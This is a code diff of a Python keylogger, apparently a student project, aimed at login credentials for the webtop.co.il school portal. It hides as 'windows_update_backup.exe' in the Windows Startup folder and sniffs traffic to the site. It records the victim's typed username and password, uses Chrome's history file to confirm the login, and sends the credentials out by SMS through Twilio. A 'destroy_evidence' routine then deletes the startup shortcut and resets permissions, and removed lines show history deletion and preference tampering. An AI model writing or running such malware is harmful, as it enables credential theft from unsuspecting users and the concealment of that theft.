@@ -8,26 +8,27 @@ import requests  # to send the password to Twilio so that it can send an sms to 
 import sys
 import os  # find where the history and startup folders are
 
-INTERFACE = ["Ethernet", "Wi-Fi"]
+PATH_TO_CONNECTIONS = os.environ['USERPROFILE'] + r"\Desktop\system\connections.txt"
+counter = 0
+INTERFACE = []
 caps = False
 caps_lock_on = False
 shift = False
 isTrue = False
-has_two = 0
-counter = 0
-HISTORY_FILE = ""
-PATH_TO_PROGRAM = os.environ['USERPROFILE'] + r"Desktop\system\windows_update_backup.exe"
+PATH_TO_PROGRAM = os.environ['USERPROFILE'] + r"\Desktop\system\windows_update_backup.exe"
 STARTUP_DIRECTORY = os.getenv('PROGRAMDATA') + r'\Microsoft\Windows\Start Menu\Programs\StartUp'
+# The history file of chrome could also be in "profile 1" instead of "default" , need to check for both
 HISTORY_FILE_OPTIONS = [os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\History",
                         os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Profile 1\History"]
-PREFERENCE_OPTIONS = [os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Preference",
-                        os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Profile 1\Preference"]
-PREFERENCE_FILE = ""
-# The history file of chrome could also be in "profile 1" instead of "default" , should check for both
 FULL_URL = 'www.webtop.co.il/v2/default.aspx'
 GOT_IN_AFTER_INCORRECT_TRY = 'www.webtop.co.il/v2/default.aspx?loginFailure=1&autoLoad=alert'
 INCORRECT_LOGIN_URL = 'www.webtop.co.il/v2/default.aspx?loginFailure=1'
 
+# logdir = os.environ['USERPROFILE'] + cm'\\Desktop\\'
+# logdir = r"C:/Users/Admin/Documents/Yehonatan/Cyber/project/"
+# Uploads logged keys to a file called klog-res.txt
+# logging.basicConfig(filename=(logdir + "123.txt"), level=logging.INFO, format="%(message)s")
+# logs the keys to file
 LIST_OF_SPECIALS = ["Key.tab", "Key.caps_lock", "Key.shift", "Key.ctrl_l", "Key.cmd", "Key.alt_l",
                     "Key.alt_r", "Key.menu", "Key.left", "Key.down", "Key.right", "Key.up", "Key.insert",
                     "Key.delete", "Key.print_screen", "Key.home", "Key.end", "Key.page_up", "Key.page_down",
@@ -45,9 +46,14 @@ def on_press(key):
         change_caps(key)
 
 
+def add_comma():
+    """function mainly to separate the username and password if victim tabs between the username and password"""
+    global username_and_password
+    username_and_password += ","
+
+
 def on_release(key):
     """ When a key is being released, check if you should add it to the message, ignore it or change the caps"""
-    global username_and_password
     global shift
     global caps
     global LIST_OF_SPECIALS
@@ -58,8 +64,18 @@ def on_release(key):
         pass
     elif str(key) == "Key.backspace":
         delete_letter()
+    elif str(key) == "Key.enter":
+        make_newline()
+    elif str(key) == "Key.tab":
+        add_comma()
     else:
         add_password(key)
+
+
+def make_newline():
+    """ Makes a new line if the user hit the enter """
+    global username_and_password
+    username_and_password = username_and_password + "\n"
 
 
 def delete_letter():
@@ -75,7 +91,6 @@ def add_password(key):
     global special_numbers
     global username_and_password
     if str(key).replace("'", "") in special_numbers and shift:
-        # f.write(special_numbers[str(key).replace("'", "")])
         username_and_password += special_numbers[str(key).replace("'", "")]
     else:
         if str(key) == "Key.space":
@@ -84,10 +99,8 @@ def add_password(key):
             letter = str(key).replace("'", '')
         if caps:
             username_and_password += letter.upper()
-            # f.write(letter.upper())
         else:
             username_and_password += letter
-            # f.write(letter)
 
 
 def run_keylogger():
@@ -121,40 +134,28 @@ def change_caps(key):
 def check_history():
     """Checks if the url of webtop once you log in is in the history file,
      returns True if in the file and False otherwise"""
-    global HISTORY_FILE
+    global counter
+    global HISTORY_FILE_OPTIONS
     global FULL_URL
     global GOT_IN_AFTER_INCORRECT_TRY
     global INCORRECT_LOGIN_URL
+
+    counter += 1
+    print(counter)
     time.sleep(11)
+    file = ""
     # It takes 11 seconds for history page to update
-    f = open(HISTORY_FILE, 'r', encoding='latin-1')
-    read = f.read()
+    for x in HISTORY_FILE_OPTIONS:
+        try:
+            file = open(x, 'r', encoding='latin-1')
+        except FileNotFoundError as e:
+            pass
+    read = file.read()
+
     if FULL_URL in read and INCORRECT_LOGIN_URL not in read or GOT_IN_AFTER_INCORRECT_TRY in read:
         return True
     else:
         return False
-
-
-def where_is_history_file():
-    """ finds out where is the History file (I found 2 places it could be)"""
-    global HISTORY_FILE_OPTIONS
-    global HISTORY_FILE
-    for option in HISTORY_FILE_OPTIONS:
-        try:
-            isFile = os.path.exists(option)
-            if isFile:
-                HISTORY_FILE = option
-        except FileNotFoundError:
-            pass
-
-
-where_is_history_file()
-
-
-def delete_history():
-    """Deletes the history file on the computer for google chrome"""
-    global HISTORY_FILE
-    os.remove(HISTORY_FILE)
 
 
 def send_sms():
@@ -162,12 +163,13 @@ def send_sms():
     """By using the requests package, the function sends a post request to Twilio which sends an sms to me with the 
     info of the password"""
     global username_and_password
-    account_sid = "YOUR_ACCOUNT_SID"
+
+    account_sid = "YOUR_ACOUNT_SID"
     # os.environ['ACCOUNT_SID']
-    authentication_token = "YOUR_AUTH_TOKEN"
-    sender_number = "PHONE_NUMBER_YOU_BOUGHT"
+    authentication_token = "YOUR_ACCOUNT_TOKEN"
+    sender_number = "YOUR TWILIO NUMBER"
     # os.environ['AUTH_TOKEN']
-    receiver_number = "YOUR_PHONE_NUMBER"
+    receiver_number = "PHONE NUMBER"
     # os.environ['MY_PHONE_NUMBER']
     # client = Client(account_sid, authentication_token)
     response = requests.post(
@@ -180,58 +182,44 @@ def send_sms():
         })
 
 
-def change_preferences():
-    global HISTORY_FILE
-    file = open(HISTORY_FILE, 'r', encoding='latin-1')
-    read_file = file.read()
-    a = read_file.replace('"exit_type":"Crashed"', '"exit_type":"Normal"')
-    file = open(os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Preferences", 'w', encoding='latin-1')
-    file.write(a)
-
-
-def check_if_deleted():
-    """Checks if the history was deleted every time the user restarts the computer. If not, it deletes the history and
-    creates a txt file containing the history that was deleted - the sign that the history was deleted at least once"""
-    global HISTORY_FILE
-    try:
-        file_test = open(HISTORY_FILE + '-logs.txt', 'r')
-        file_test.close()
-    except FileNotFoundError:
-        file = open(HISTORY_FILE, 'r', encoding='latin-1')
-        read_file = file.read()
-        file.close()
-        file_change = open(HISTORY_FILE + '-logs.txt', 'a', encoding='latin-1')
-        file_change.write(read_file)
-        change_preferences()
-        delete_history()
+def check_internet_sources():
+    """  Check for the source of the internet connection to sniff through those. Using the txt file that contains
+    the connections and their status that was checked before the program starts.
+      The function will return the names of the sources of network active"""
+    global INTERFACE
+    global PATH_TO_CONNECTIONS
+    file = open(PATH_TO_CONNECTIONS, 'r', encoding='utf-16')
+    for line in file:
+        line = line.strip()
+        if line[-1] == "2" and line[-2] == " ":
+            line = line[:-1]
+            line = line.strip()
+            INTERFACE.append(line)
 
 
 def destroy_evidence():
     global PATH_TO_PROGRAM
     """This function will restore all the settings before the download of the program,
      the shortcut and the program itself"""
-    # os.system(f'icacls "{STARTUP_DIRECTORY}" /reset /t')
-    # os.remove(HISTORY_FILE + '-logs.txt')
-    # os.remove(rf"{os.getenv('PROGRAMDATA')}\Microsoft\Windows\Start Menu\Programs\StartUp\test.lnk")
-    # os.remove(rf"{PATH_TO_PROGRAM}")
+    os.remove(rf"{os.getenv('PROGRAMDATA')}\Microsoft\Windows\Start Menu\Programs\StartUp\test.lnk")
+    os.system(f'icacls "{STARTUP_DIRECTORY}" /reset /t')
+    #  os.remove(rf"{PATH_TO_PROGRAM}")
 
 
 def main():
     """Starts the sniffing,starts the keylogger in run_keylogger and checks if user logged in by
      calling the check_history() function, logs the keylogger in log() function and exits code if they are."""
-    global username_and_password
-    check_if_deleted()
+    global INTERFACE
+    check_internet_sources()
     print('start')
     addr1 = socket.gethostbyname('webtop.co.il')
-    sniff(iface=INTERFACE, filter=f"host {addr1}", count=30)
+    sniff(iface=INTERFACE, filter=f"host {addr1}", count=40)
     tracker = threading.Thread(target=run_keylogger, daemon=True)
     tracker.setDaemon(True)
     tracker.start()
 
     while 1:
-        sniff(iface=INTERFACE, filter=f"host {addr1}", count=20)
-        checking_history = threading.Thread(target=check_history)
-        checking_history.start()
+        sniff(iface=INTERFACE, filter=f"host {addr1}", count=1)
         logged_in = check_history()
         if logged_in:
             send_sms()
@@ -239,12 +227,14 @@ def main():
             # log()
             destroy_evidence()
             sys.exit()
+        else:
+            print(f"failed try number {counter}")
 
 
 if __name__ == "__main__":
     main()
 
-# Further continue the program beyond minimal viable product:
+# Further continue the program beyond product:
 
 # 1) Make the keylogger deal with the shift after the victim entered username and password
 # It is too slow now and can slightly miss Changes in shift and check generally for bugs
@@ -281,6 +271,5 @@ if __name__ == "__main__":
 # 2) DONE  check for wifi or ethernet interface, it could be any one of those
 # 3) Find way, after restart, to not delete history but only after first encounter
 # 4) Use Twilio without the helper package - it takes too much and the download time take too long
-
-
 # 5) The program will remove all traces of itself, the shortcut and any settings changes it did
+# 6) The program will check for all internet interfaces and sniff through them all.
